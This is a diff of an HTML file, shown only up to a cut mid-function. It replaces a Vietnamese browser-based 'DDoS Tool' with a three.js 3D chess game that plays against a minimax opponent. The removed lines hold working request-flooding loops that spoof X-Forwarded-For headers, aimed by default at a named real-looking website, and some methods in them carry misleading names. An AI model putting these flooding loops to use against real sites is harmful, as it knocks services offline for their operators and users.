@@ -3,370 +3,855 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS Tool - Tấn Công Web</title>
+    <title>Bui Minh Phat Chess</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            margin: 0;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
-        .container {
-            background: rgba(0, 0, 0, 0.9);
-            border: 2px solid #00ff00;
+        #info {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            pointer-events: none;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            border-left: 5px solid #ffaa00;
+        }
+        #turn-indicator {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            pointer-events: none;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            font-weight: bold;
+            font-size: 1.2em;
+            border-right: 5px solid #ffaa00;
+        }
+        #captured-white {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            color: #ddd;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 0.9em;
+        }
+        #captured-black {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            color: #ddd;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 0.9em;
+        }
+        #thinking-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.85);
+            color: #ffaa00;
+            padding: 20px 40px;
             border-radius: 15px;
-            padding: 40px;
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
-            width: 600px;
-            text-align: center;
-        }
-        
-        h1 {
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
-            font-size: 32px;
-            margin-bottom: 10px;
-            letter-spacing: 3px;
-        }
-        
-        .subtitle {
-            color: #00ff00;
-            margin-bottom: 30px;
-            font-size: 14px;
-            opacity: 0.8;
-        }
-        
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #00ff00;
-            font-weight: bold;
-        }
-        
-        input, select {
-            width: 100%;
-            padding: 15px;
-            background: #111;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            border-radius: 8px;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            outline: none;
-            transition: all 0.3s;
-        }
-        
-        input:focus, select:focus {
-            border-color: #ff0000;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-        }
-        
-        input::placeholder {
-            color: #004400;
-        }
-        
-        .btn-attack {
-            width: 100%;
-            padding: 18px;
-            background: #ff0000;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            transition: all 0.3s;
-            animation: pulse 2s infinite;
-        }
-        
-        .btn-attack:hover {
-            background: #cc0000;
-            box-shadow: 0 0 30px #ff0000;
-            transform: scale(1.05);
-        }
-        
-        .btn-attack:active {
-            transform: scale(0.95);
-        }
-        
-        .btn-stop {
-            width: 100%;
-            padding: 18px;
-            background: #333;
-            color: #ff0000;
-            border: 2px solid #ff0000;
-            border-radius: 8px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
             display: none;
+            font-size: 1.5em;
+            font-weight: bold;
+            z-index: 100;
+            border: 2px solid #ffaa00;
+            animation: pulse 1s infinite;
         }
-        
         @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
         }
-        
-        .stats {
-            margin-top: 20px;
-            padding: 15px;
-            background: #111;
-            border: 1px solid #00ff00;
-            border-radius: 8px;
-            display: none;
+        #new-game-btn {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ffaa00;
+            color: #000;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 50;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            transition: all 0.3s;
         }
-        
-        .stat-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            color: #00ff00;
-        }
-        
-        .log {
-            margin-top: 20px;
-            padding: 15px;
-            background: #000;
-            border: 1px solid #333;
-            border-radius: 8px;
-            max-height: 200px;
-            overflow-y: auto;
-            text-align: left;
-            font-size: 12px;
-            display: none;
-        }
-        
-        .warning {
-            color: #ff0000;
-            font-size: 12px;
-            margin-top: 20px;
-            border-top: 1px solid #333;
-            padding-top: 15px;
+        #new-game-btn:hover {
+            background: #ffbb22;
+            transform: translateX(-50%) scale(1.05);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>⚡ DDoS TOOL ⚡</h1>
-        <p class="subtitle">CÔNG CỤ TẤN CÔNG TỪ CHỐI DỊCH VỤ</p>
-        
-        <div class="input-group">
-            <label>🎯 URL MỤC TIÊU:</label>
-            <input type="text" id="targetUrl" placeholder="https://khoindvn.io.vn/" value="https://khoindvn.io.vn/">
-        </div>
-        
-        <div class="input-group">
-            <label>⚙️ PHƯƠNG THỨC:</label>
-            <select id="method">
-                <option value="1">HTTP Flood</option>
-                <option value="2">Slowloris</option>
-                <option value="3">UDP Flood</option>
-                <option value="4">TẤT CẢ (Hỗn Hợp)</option>
-            </select>
-        </div>
-        
-        <div class="input-group">
-            <label>🔢 SỐ LUỒNG:</label>
-            <input type="number" id="threads" value="500" min="1" max="5000">
-        </div>
-        
-        <button class="btn-attack" id="attackBtn" onclick="startAttack()">💥 TẤN CÔNG 💥</button>
-        <button class="btn-stop" id="stopBtn" onclick="stopAttack()">🛑 DỪNG LẠI</button>
-        
-        <div class="stats" id="stats">
-            <div class="stat-item">
-                <span>📊 REQUEST ĐÃ GỬI:</span>
-                <span id="requestCount">0</span>
-            </div>
-            <div class="stat-item">
-                <span>✅ THÀNH CÔNG:</span>
-                <span id="successCount">0</span>
-            </div>
-            <div class="stat-item">
-                <span>❌ THẤT BẠI:</span>
-                <span id="failCount">0</span>
-            </div>
-            <div class="stat-item">
-                <span>⏱️ THỜI GIAN:</span>
-                <span id="timeCount">0s</span>
-            </div>
-        </div>
-        
-        <div class="log" id="logBox"></div>
-        
-        <p class="warning">⚠️ CẢNH BÁO: Chỉ sử dụng cho mục đích nghiên cứu bảo mật!</p>
+    <div id="info">
+        <h2>♟ Bui Minh Phat Chess</h2>
+        <p>Bạn (Trắng) vs Máy (Đen)</p>
+        <p>Click chọn quân -> Click ô đích</p>
     </div>
+    <div id="turn-indicator">Lượt của: <span style="color: #ffaa00;">BẠN</span></div>
+    <div id="captured-white">Quân trắng bị bắt: <span id="cap-w-list"></span></div>
+    <div id="captured-black">Quân đen bị bắt: <span id="cap-b-list"></span></div>
+    <div id="thinking-overlay">🤖 Máy đang suy nghĩ...</div>
+    <button id="new-game-btn">🔄 Ván Mới</button>
 
-    <script>
-        let running = false;
-        let workers = [];
-        let requestCount = 0;
-        let successCount = 0;
-        let failCount = 0;
-        let startTime = 0;
-        let timerInterval = null;
+    <script type="importmap">
+        {
+            "imports": {
+                "three": "https://unpkg.com/three@0.157.0/build/three.module.js",
+                "three/addons/": "https://unpkg.com/three@0.157.0/examples/jsm/"
+            }
+        }
+    </script>
 
-        function log(message, type = 'info') {
-            const logBox = document.getElementById('logBox');
-            logBox.style.display = 'block';
-            const line = document.createElement('div');
-            line.style.color = type === 'success' ? '#00ff00' : type === 'error' ? '#ff0000' : '#00ff00';
-            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logBox.appendChild(line);
-            logBox.scrollTop = logBox.scrollHeight;
-            
-            if (logBox.children.length > 50) {
-                logBox.removeChild(logBox.firstChild);
+    <script type="module">
+        import * as THREE from 'three';
+        import { OrbitControls } from 'three/addons/controls/OrbitControls.js';
+        import { CSS2DRenderer, CSS2DObject } from 'three/addons/renderers/CSS2DRenderer.js';
+
+        // ==================== KHỞI TẠO SCENE ====================
+        const scene = new THREE.Scene();
+        scene.background = new THREE.Color(0x1a1a2e);
+        scene.fog = new THREE.Fog(0x1a1a2e, 15, 30);
+
+        const camera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.5, 50);
+        camera.position.set(10, 12, 12);
+        camera.lookAt(3.5, 0, 3.5);
+
+        const renderer = new THREE.WebGLRenderer({ antialias: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.shadowMap.enabled = true;
+        renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+        renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+        document.body.appendChild(renderer.domElement);
+
+        const labelRenderer = new CSS2DRenderer();
+        labelRenderer.setSize(window.innerWidth, window.innerHeight);
+        labelRenderer.domElement.style.position = 'absolute';
+        labelRenderer.domElement.style.top = '0px';
+        labelRenderer.domElement.style.pointerEvents = 'none';
+        document.body.appendChild(labelRenderer.domElement);
+
+        const controls = new OrbitControls(camera, renderer.domElement);
+        controls.target.set(3.5, 0, 3.5);
+        controls.enableDamping = true;
+        controls.dampingFactor = 0.1;
+        controls.maxPolarAngle = Math.PI / 2.4;
+        controls.minDistance = 8;
+        controls.maxDistance = 20;
+        controls.update();
+
+        // ==================== ÁNH SÁNG ====================
+        const ambientLight = new THREE.AmbientLight(0x404060, 1.2);
+        scene.add(ambientLight);
+        
+        const dirLight = new THREE.DirectionalLight(0xffeedd, 2.5);
+        dirLight.position.set(10, 15, 5);
+        dirLight.castShadow = true;
+        dirLight.shadow.mapSize.width = 2048;
+        dirLight.shadow.mapSize.height = 2048;
+        dirLight.shadow.camera.near = 0.5;
+        dirLight.shadow.camera.far = 50;
+        dirLight.shadow.camera.left = -15;
+        dirLight.shadow.camera.right = 15;
+        dirLight.shadow.camera.top = 15;
+        dirLight.shadow.camera.bottom = -15;
+        dirLight.shadow.bias = -0.0001;
+        scene.add(dirLight);
+        
+        const pointLight1 = new THREE.PointLight(0xff8844, 1.5, 20);
+        pointLight1.position.set(-2, 5, -2);
+        scene.add(pointLight1);
+        const pointLight2 = new THREE.PointLight(0x4488ff, 1.5, 20);
+        pointLight2.position.set(9, 5, 9);
+        scene.add(pointLight2);
+
+        // ==================== BÀN CỜ ====================
+        const boardGroup = new THREE.Group();
+        const squareSize = 1;
+        const boardSize = 8;
+        const squares = [];
+
+        for (let row = 0; row < 8; row++) {
+            squares[row] = [];
+            for (let col = 0; col < 8; col++) {
+                const isDark = (row + col) % 2 === 1;
+                const geometry = new THREE.BoxGeometry(squareSize * 0.95, 0.1, squareSize * 0.95);
+                const material = new THREE.MeshStandardMaterial({
+                    color: isDark ? 0x4a3728 : 0xe8d5b7,
+                    roughness: 0.4,
+                    metalness: 0.1
+                });
+                const square = new THREE.Mesh(geometry, material);
+                square.position.set(col, -0.05, row);
+                square.receiveShadow = true;
+                square.castShadow = true;
+                square.userData = { row, col, isDark };
+                boardGroup.add(square);
+                squares[row][col] = square;
             }
         }
 
-        function updateStats() {
-            document.getElementById('requestCount').textContent = requestCount;
-            document.getElementById('successCount').textContent = successCount;
-            document.getElementById('failCount').textContent = failCount;
-            document.getElementById('timeCount').textContent = Math.floor((Date.now() - startTime) / 1000) + 's';
+        // Viền bàn cờ
+        const borderGeom = new THREE.BoxGeometry(8.2, 0.25, 8.2);
+        const borderMat = new THREE.MeshStandardMaterial({ color: 0x2c1810, roughness: 0.3, metalness: 0.5 });
+        const border = new THREE.Mesh(borderGeom, borderMat);
+        border.position.set(3.5, -0.18, 3.5);
+        border.receiveShadow = true;
+        border.castShadow = true;
+        boardGroup.add(border);
+
+        // Chân bàn
+        for (let i = 0; i < 4; i++) {
+            const legGeom = new THREE.CylinderGeometry(0.15, 0.2, 0.8);
+            const legMat = new THREE.MeshStandardMaterial({ color: 0x1a0a00, roughness: 0.2, metalness: 0.6 });
+            const leg = new THREE.Mesh(legGeom, legMat);
+            const x = i % 2 === 0 ? -0.3 : 7.3;
+            const z = i < 2 ? -0.3 : 7.3;
+            leg.position.set(x, -0.55, z);
+            leg.castShadow = true;
+            leg.receiveShadow = true;
+            boardGroup.add(leg);
         }
 
-        function httpFlood(target) {
-            return function() {
-                while (running) {
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('GET', target + '?rand=' + Math.random(), true);
-                        xhr.setRequestHeader('X-Forwarded-For', Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255));
-                        xhr.setRequestHeader('Cache-Control', 'no-cache');
-                        xhr.send();
-                        requestCount++;
-                        successCount++;
-                        log('HTTP Request gửi thành công', 'success');
-                        updateStats();
-                    } catch(e) {
-                        requestCount++;
-                        failCount++;
-                        log('HTTP Request thất bại', 'error');
-                        updateStats();
-                    }
-                }
-            };
-        }
-
-        function slowloris(target) {
-            return function() {
-                while (running) {
-                    try {
-                        const img = new Image();
-                        img.src = target + '?slow=' + Math.random();
-                        requestCount++;
-                        successCount++;
-                        log('Slowloris packet sent', 'success');
-                        updateStats();
-                    } catch(e) {
-                        failCount++;
-                        log('Slowloris failed', 'error');
-                        updateStats();
-                    }
-                }
-            };
-        }
-
-        function udpFlood(target) {
-            return function() {
-                while (running) {
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('POST', target, true);
-                        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
-                        const data = new ArrayBuffer(1400);
-                        xhr.send(data);
-                        requestCount++;
-                        successCount++;
-                        log('UDP packet sent', 'success');
-                        updateStats();
-                    } catch(e) {
-                        failCount++;
-                        log('UDP failed', 'error');
-                        updateStats();
-                    }
-                }
-            };
-        }
-
-        function startAttack() {
-            const target = document.getElementById('targetUrl').value;
-            const method = document.getElementById('method').value;
-            const threadCount = parseInt(document.getElementById('threads').value);
+        // Nhãn tọa độ
+        for (let i = 0; i < 8; i++) {
+            const letterDiv = document.createElement('div');
+            letterDiv.textContent = String.fromCharCode(97 + i);
+            letterDiv.style.color = '#ffffff';
+            letterDiv.style.fontWeight = 'bold';
+            letterDiv.style.fontSize = '14px';
+            const letterLabel = new CSS2DObject(letterDiv);
+            letterLabel.position.set(i, 0.05, -0.6);
+            boardGroup.add(letterLabel);
             
-            if (!target) {
-                alert('Vui lòng nhập URL mục tiêu!');
+            const numberDiv = document.createElement('div');
+            numberDiv.textContent = (8 - i).toString();
+            numberDiv.style.color = '#ffffff';
+            numberDiv.style.fontWeight = 'bold';
+            numberDiv.style.fontSize = '14px';
+            const numberLabel = new CSS2DObject(numberDiv);
+            numberLabel.position.set(-0.6, 0.05, i);
+            boardGroup.add(numberLabel);
+        }
+
+        scene.add(boardGroup);
+
+        // Sàn
+        const floorGeom = new THREE.PlaneGeometry(30, 30);
+        const floorMat = new THREE.MeshStandardMaterial({ color: 0x2a2a3a, roughness: 0.8 });
+        const floor = new THREE.Mesh(floorGeom, floorMat);
+        floor.rotation.x = -Math.PI / 2;
+        floor.position.y = -1;
+        floor.receiveShadow = true;
+        scene.add(floor);
+
+        // ==================== QUÂN CỜ ====================
+        const piecesGroup = new THREE.Group();
+        scene.add(piecesGroup);
+        
+        const pieceMeshes = {};
+        const PIECE_TYPES = ['king', 'queen', 'rook', 'bishop', 'knight', 'pawn'];
+        
+        function createPieceMesh(type, color) {
+            const group = new THREE.Group();
+            const isWhite = color === 'white';
+            const mainColor = isWhite ? 0xf5f5f0 : 0x1a1a1a;
+            const accentColor = isWhite ? 0xdddddd : 0x333333;
+            
+            const baseGeom = new THREE.CylinderGeometry(0.35, 0.4, 0.2, 32);
+            const baseMesh = new THREE.Mesh(baseGeom, new THREE.MeshStandardMaterial({ color: mainColor, roughness: 0.3, metalness: 0.4 }));
+            baseMesh.castShadow = true;
+            baseMesh.receiveShadow = true;
+            group.add(baseMesh);
+            
+            let bodyGeom;
+            switch(type) {
+                case 'pawn':
+                    bodyGeom = new THREE.SphereGeometry(0.28, 32, 16, 0, Math.PI * 2, 0, Math.PI / 1.5);
+                    break;
+                case 'rook':
+                    bodyGeom = new THREE.CylinderGeometry(0.3, 0.32, 0.7, 8);
+                    break;
+                case 'knight':
+                    bodyGeom = new THREE.ConeGeometry(0.28, 0.6, 6);
+                    break;
+                case 'bishop':
+                    bodyGeom = new THREE.ConeGeometry(0.25, 0.75, 16);
+                    break;
+                case 'queen':
+                    bodyGeom = new THREE.CylinderGeometry(0.25, 0.33, 0.7, 16);
+                    break;
+                case 'king':
+                    bodyGeom = new THREE.CylinderGeometry(0.28, 0.35, 0.8, 16);
+                    break;
+            }
+            
+            const bodyMesh = new THREE.Mesh(bodyGeom, new THREE.MeshStandardMaterial({ color: mainColor, roughness: 0.3, metalness: 0.5 }));
+            bodyMesh.position.y = 0.2;
+            bodyMesh.castShadow = true;
+            bodyMesh.receiveShadow = true;
+            group.add(bodyMesh);
+            
+            if (type === 'king') {
+                const crownGeom = new THREE.TorusGeometry(0.15, 0.06, 8, 16);
+                const crownMesh = new THREE.Mesh(crownGeom, new THREE.MeshStandardMaterial({ color: accentColor, roughness: 0.2, metalness: 0.7 }));
+                crownMesh.position.y = 0.65;
+                crownMesh.castShadow = true;
+                group.add(crownMesh);
+            } else if (type === 'queen') {
+                const crownGeom = new THREE.ConeGeometry(0.15, 0.2, 8);
+                const crownMesh = new THREE.Mesh(crownGeom, new THREE.MeshStandardMaterial({ color: accentColor, roughness: 0.2, metalness: 0.7 }));
+                crownMesh.position.y = 0.65;
+                crownMesh.castShadow = true;
+                group.add(crownMesh);
+            } else if (type === 'bishop') {
+                const topGeom = new THREE.SphereGeometry(0.12, 8, 8);
+                const topMesh = new THREE.Mesh(topGeom, new THREE.MeshStandardMaterial({ color: accentColor, roughness: 0.2, metalness: 0.7 }));
+                topMesh.position.y = 0.65;
+                topMesh.castShadow = true;
+                group.add(topMesh);
+            }
+            
+            return group;
+        }
+
+        // ==================== LOGIC CỜ VUA ====================
+        const initialBoard = [
+            ['r', 'n', 'b', 'q', 'k', 'b', 'n', 'r'],
+            ['p', 'p', 'p', 'p', 'p', 'p', 'p', 'p'],
+            ['', '', '', '', '', '', '', ''],
+            ['', '', '', '', '', '', '', ''],
+            ['', '', '', '', '', '', '', ''],
+            ['', '', '', '', '', '', '', ''],
+            ['P', 'P', 'P', 'P', 'P', 'P', 'P', 'P'],
+            ['R', 'N', 'B', 'Q', 'K', 'B', 'N', 'R']
+        ];
+
+        let board = JSON.parse(JSON.stringify(initialBoard));
+        let currentPlayer = 'white';
+        let selectedPiece = null;
+        let gameOver = false;
+        let capturedByWhite = [];
+        let capturedByBlack = [];
+        let isAIThinking = false;
+
+        const pieceValues = {
+            'p': 100, 'n': 320, 'b': 330, 'r': 500, 'q': 900, 'k': 20000,
+            'P': 100, 'N': 320, 'B': 330, 'R': 500, 'Q': 900, 'K': 20000
+        };
+
+        function getPieceColor(piece) {
+            if (!piece) return null;
+            return piece === piece.toUpperCase() ? 'white' : 'black';
+        }
+
+        function getPieceType(piece) {
+            if (!piece) return null;
+            const p = piece.toLowerCase();
+            const map = { 'p': 'pawn', 'n': 'knight', 'b': 'bishop', 'r': 'rook', 'q': 'queen', 'k': 'king' };
+            return map[p];
+        }
+
+        function isInBounds(row, col) {
+            return row >= 0 && row < 8 && col >= 0 && col < 8;
+        }
+
+        function getPseudoLegalMoves(row, col, piece) {
+            const moves = [];
+            const color = getPieceColor(piece);
+            const type = getPieceType(piece);
+            const opponentColor = color === 'white' ? 'black' : 'white';
+            
+            function addMoveIfValid(r, c) {
+                if (!isInBounds(r, c)) return false;
+                const target = board[r][c];
+                if (target && getPieceColor(target) === color) return false;
+                moves.push({ row: r, col: c });
+                return !target;
+            }
+
+            switch(type) {
+                case 'pawn':
+                    const dir = color === 'white' ? -1 : 1;
+                    const startRow = color === 'white' ? 6 : 1;
+                    if (isInBounds(row + dir, col) && !board[row + dir][col]) {
+                        moves.push({ row: row + dir, col: col });
+                        if (row === startRow && !board[row + 2*dir][col]) {
+                            moves.push({ row: row + 2*dir, col: col });
+                        }
+                    }
+                    for (const dc of [-1, 1]) {
+                        const r = row + dir, c = col + dc;
+                        if (isInBounds(r, c) && board[r][c] && getPieceColor(board[r][c]) === opponentColor) {
+                            moves.push({ row: r, col: c });
+                        }
+                    }
+                    break;
+                case 'knight':
+                    for (const [dr, dc] of [[-2,-1],[-2,1],[-1,-2],[-1,2],[1,-2],[1,2],[2,-1],[2,1]]) {
+                        addMoveIfValid(row + dr, col + dc);
+                    }
+                    break;
+                case 'bishop':
+                    for (const [dr, dc] of [[-1,-1],[-1,1],[1,-1],[1,1]]) {
+                        for (let i = 1; i < 8; i++) {
+                            if (!addMoveIfValid(row + dr*i, col + dc*i)) break;
+                        }
+                    }
+                    break;
+                case 'rook':
+                    for (const [dr, dc] of [[-1,0],[1,0],[0,-1],[0,1]]) {
+                        for (let i = 1; i < 8; i++) {
+                            if (!addMoveIfValid(row + dr*i, col + dc*i)) break;
+                        }
+                    }
+                    break;
+                case 'queen':
+                    for (const [dr, dc] of [[-1,-1],[-1,1],[1,-1],[1,1],[-1,0],[1,0],[0,-1],[0,1]]) {
+                        for (let i = 1; i < 8; i++) {
+                            if (!addMoveIfValid(row + dr*i, col + dc*i)) break;
+                        }
+                    }
+                    break;
+                case 'king':
+                    for (const [dr, dc] of [[-1,-1],[-1,0],[-1,1],[0,-1],[0,1],[1,-1],[1,0],[1,1]]) {
+                        addMoveIfValid(row + dr, col + dc);
+                    }
+                    break;
+            }
+            return moves;
+        }
+
+        function isKingInCheck(color) {
+            let kingRow = -1, kingCol = -1;
+            const kingChar = color === 'white' ? 'K' : 'k';
+            for (let r = 0; r < 8; r++) {
+                for (let c = 0; c < 8; c++) {
+                    if (board[r][c] === kingChar) {
+                        kingRow = r;
+                        kingCol = c;
+                        break;
+                    }
+                }
+            }
+            const opponentColor = color === 'white' ? 'black' : 'white';
+            for (let r = 0; r < 8; r++) {
+                for (let c = 0; c < 8; c++) {
+                    const piece = board[r][c];
+                    if (piece && getPieceColor(piece) === opponentColor) {
+                        const moves = getPseudoLegalMoves(r, c, piece);
+                        if (moves.some(m => m.row === kingRow && m.col === kingCol)) {
+                            return true;
+                        }
+                    }
+                }
+            }
+            return false;
+        }
+
+        function getLegalMoves(row, col, piece) {
+            const pseudoMoves = getPseudoLegalMoves(row, col, piece);
+            const legalMoves = [];
+            const color = getPieceColor(piece);
+            
+            for (const move of pseudoMoves) {
+                const tempBoard = board.map(r => [...r]);
+                board[move.row][move.col] = piece;
+                board[row][col] = '';
+                if (!isKingInCheck(color)) {
+                    legalMoves.push(move);
+                }
+                board = tempBoard;
+            }
+            return legalMoves;
+        }
+
+        function hasAnyLegalMove(color) {
+            for (let r = 0; r < 8; r++) {
+                for (let c = 0; c < 8; c++) {
+                    const piece = board[r][c];
+                    if (piece && getPieceColor(piece) === color) {
+                        if (getLegalMoves(r, c, piece).length > 0) return true;
+                    }
+                }
+            }
+            return false;
+        }
+
+        function evaluateBoard() {
+            let score = 0;
+            for (let r = 0; r < 8; r++) {
+                for (let c = 0; c < 8; c++) {
+                    const piece = board[r][c];
+                    if (piece) {
+                        const value = pieceValues[piece] || 0;
+                        score += getPieceColor(piece) === 'white' ? value : -value;
+                    }
+                }
+            }
+            return score;
+        }
+
+        function minimax(depth, alpha, beta, isMaximizing) {
+            if (depth === 0) {
+                return evaluateBoard();
+            }
+            
+            const color = isMaximizing ? 'white' : 'black';
+            if (!hasAnyLegalMove(color)) {
+                if (isKingInCheck(color)) {
+                    return isMaximizing ? -100000 + (4-depth) : 100000 - (4-depth);
+                }
+                return 0;
+            }
+            
+            if (isMaximizing) {
+                let maxEval = -Infinity;
+                for (let r = 0; r < 8; r++) {
+                    for (let c = 0; c < 8; c++) {
+                        const piece = board[r][c];
+                        if (piece && getPieceColor(piece) === 'white') {
+                            const moves = getLegalMoves(r, c, piece);
+                            for (const move of moves) {
+                                const captured = board[move.row][move.col];
+                                board[move.row][move.col] = piece;
+                                board[r][c] = '';
+                                const evalScore = minimax(depth - 1, alpha, beta, false);
+                                board[r][c] = piece;
+                                board[move.row][move.col] = captured;
+                                maxEval = Math.max(maxEval, evalScore);
+                                alpha = Math.max(alpha, evalScore);
+                                if (beta <= alpha) break;
+                            }
+                        }
+                        if (beta <= alpha) break;
+                    }
+                    if (beta <= alpha) break;
+                }
+                return maxEval;
+            } else {
+                let minEval = Infinity;
+                for (let r = 0; r < 8; r++) {
+                    for (let c = 0; c < 8; c++) {
+                        const piece = board[r][c];
+                        if (piece && getPieceColor(piece) === 'black') {
+                            const moves = getLegalMoves(r, c, piece);
+                            for (const move of moves) {
+                                const captured = board[move.row][move.col];
+                                board[move.row][move.col] = piece;
+                                board[r][c] = '';
+                                const evalScore = minimax(depth - 1, alpha, beta, true);
+                                board[r][c] = piece;
+                                board[move.row][move.col] = captured;
+                                minEval = Math.min(minEval, evalScore);
+                                beta = Math.min(beta, evalScore);
+                                if (beta <= alpha) break;
+                            }
+                        }
+                        if (beta <= alpha) break;
+                    }
+                    if (beta <= alpha) break;
+                }
+                return minEval;
+            }
+        }
+
+        function getBestAIMove() {
+            let bestScore = Infinity;
+            let bestMove = null;
+            const alpha = -Infinity;
+            const beta = Infinity;
+            
+            const allMoves = [];
+            for (let r = 0; r < 8; r++) {
+                for (let c = 0; c < 8; c++) {
+                    const piece = board[r][c];
+                    if (piece && getPieceColor(piece) === 'black') {
+                        const moves = getLegalMoves(r, c, piece);
+                        for (const move of moves) {
+                            allMoves.push({ fromRow: r, fromCol: c, toRow: move.row, toCol: move.col });
+                        }
+                    }
+                }
+            }
+            
+            for (let i = allMoves.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [allMoves[i], allMoves[j]] = [allMoves[j], allMoves[i]];
+            }
+            
+            for (const move of allMoves) {
+                const piece = board[move.fromRow][move.fromCol];
+                const captured = board[move.toRow][move.toCol];
+                board[move.toRow][move.toCol] = piece;
+                board[move.fromRow][move.fromCol] = '';
+                const score = minimax(3, alpha, beta, true);
+                board[move.fromRow][move.fromCol] = piece;
+                board[move.toRow][move.toCol] = captured;
+                
+                if (score < bestScore) {
+                    bestScore = score;
+                    bestMove = move;
+                }
+            }
+            return bestMove;
+        }
+
+        // ==================== QUẢN LÝ HIỂN THỊ QUÂN CỜ ====================
+        function clearAllPieces() {
+            while(piecesGroup.children.length > 0) {
+                piecesGroup.remove(piecesGroup.children[0]);
+            }
+            for (const key in pieceMeshes) {
+                delete pieceMeshes[key];
+            }
+        }
+
+        function updatePiecePositions() {
+            clearAllPieces();
+            for (let r = 0; r < 8; r++) {
+                for (let c = 0; c < 8; c++) {
+                    const piece = board[r][c];
+                    if (piece) {
+                        const color = getPieceColor(piece);
+                        const type = getPieceType(piece);
+                        const mesh = createPieceMesh(type, color);
+                        mesh.position.set(c, 0.15, r);
+                        mesh.userData = { row: r, col: c, piece: piece };
+                        piecesGroup.add(mesh);
+                        pieceMeshes[`${r}-${c}`] = mesh;
+                    }
+                }
+            }
+        }
+
+        function highlightSquare(row, col, color) {
+            const square = squares[row]?.[col];
+            if (square) {
+                square.material.emissive = new THREE.Color(color);
+                square.material.emissiveIntensity = 0.5;
+            }
+        }
+
+        function clearAllHighlights() {
+            for (let r = 0; r < 8; r++) {
+                for (let c = 0; c < 8; c++) {
+                    if (squares[r]?.[c]) {
+                        squares[r][c].material.emissive = new THREE.Color(0x000000);
+                        squares[r][c].material.emissiveIntensity = 0;
+                    }
+                }
+            }
+        }
+
+        function updateUI() {
+            document.getElementById('turn-indicator').innerHTML = 
+                `Lượt của: <span style="color: ${currentPlayer === 'white' ? '#ffaa00' : '#8888ff'}">${currentPlayer === 'white' ? 'BẠN (Trắng)' : 'MÁY (Đen)'}</span>`;
+            document.getElementById('cap-w-list').textContent = capturedByWhite.join(' ') || '---';
+            document.getElementById('cap-b-list').textContent = capturedByBlack.join(' ') || '---';
+            
+            if (gameOver) {
+                document.getElementById('turn-indicator').innerHTML = 
+                    `<span style="color: #ff4444;">${currentPlayer === 'white' ? 'MÁY THẮNG!' : 'BẠN THẮNG!'}</span>`;
+            }
+        }
+
+        function makeMove(fromRow, fromCol, toRow, toCol) {
+            const piece = board[fromRow][fromCol];
+            const captured = board[toRow][toCol];
+            
+            if (captured) {
+                if (getPieceColor(captured) === 'white') {
+                    capturedByBlack.push(getPieceSymbol(captured));
+                } else {
+                    capturedByWhite.push(getPieceSymbol(captured));
+                }
+            }
+            
+            board[toRow][toCol] = piece;
+            board[fromRow][fromCol] = '';
+            updatePiecePositions();
+            clearAllHighlights();
+        }
+
+        function getPieceSymbol(piece) {
+            const symbols = {
+                'K': '♔', 'Q': '♕', 'R': '♖', 'B': '♗', 'N': '♘', 'P': '♙',
+                'k': '♚', 'q': '♛', 'r': '♜', 'b': '♝', 'n': '♞', 'p': '♟'
+            };
+            return symbols[piece] || piece;
+        }
+
+        function checkGameOver() {
+            if (!hasAnyLegalMove(currentPlayer)) {
+                gameOver = true;
+                if (isKingInCheck(currentPlayer)) {
